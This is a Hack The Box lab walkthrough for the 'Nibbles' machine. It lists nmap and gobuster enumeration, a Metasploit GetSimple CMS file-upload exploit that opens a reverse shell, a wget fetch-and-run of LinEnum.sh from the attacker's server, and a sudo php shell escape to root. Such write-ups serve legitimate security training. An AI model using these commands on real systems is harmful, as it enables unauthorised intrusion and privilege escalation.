# Nibbles Walkthrough (Hack The Box)

This file summarizes my process and learning while completing the Nibbles machine on Hack The Box.

---

## 🔍 Enumeration

### 1️⃣ Open Ports

```bash
nmap -sV --open -oA initial_scan 10.129.x.x
```

### 2️⃣ Directory Enumeration

```bash
nmap -sV --script=http-enum -oA http_enum 10.129.x.x
```

## 🌐 Web Footprinting

- Found paths:
  - `/admin/`
  - `/admin/index.php`
  - `/backups/`
  - `/robots.txt`
  - `/data/`

- Checked root with `curl`:

```bash
curl 10.129.134.236
```

### 3️⃣ Directory Bruteforce with Gobuster

```bash
gobuster dir -u http://10.129.x.x/data \
  --wordlist /usr/share/seclists/Discovery/Web-Content/common.txt
```

- Found:
  - `/other/`
  - `/pages/`
  - `/thumbs/`
  - `/uploads/`
  - `/users/`

- Found admin credentials during enumeration (`admin`).

---

## 🎯 Exploitation

### 4️⃣ CMS Exploitation

- Discovered target is running **GetSimple CMS 3.3.15**.
- Used Metasploit module:

```bash
msfconsole
use exploit/multi/http/getsimplecms_file_upload
set RHOSTS 10.129.x.x
set LHOST <your-IP>
check
exploit
```

- Gained reverse shell.

### 5️⃣ Upgraded shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## 🔼 Privilege Escalation

### 6️⃣ Enumeration with LinEnum

- Transfer LinEnum.sh to target:

```bash
python3 -m http.server 8080
wget http://<your-IP>:8080/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh
```

- Found interesting sudo permission:

```
/usr/bin/php
```

### 7️⃣ Root Exploitation via Sudo PHP

```bash
CMD="/bin/sh"
sudo php -r "system('$CMD');"
```

- Escalated to root.

---

> ⚠️ No flags or sensitive information included. This file is for educational purposes only.
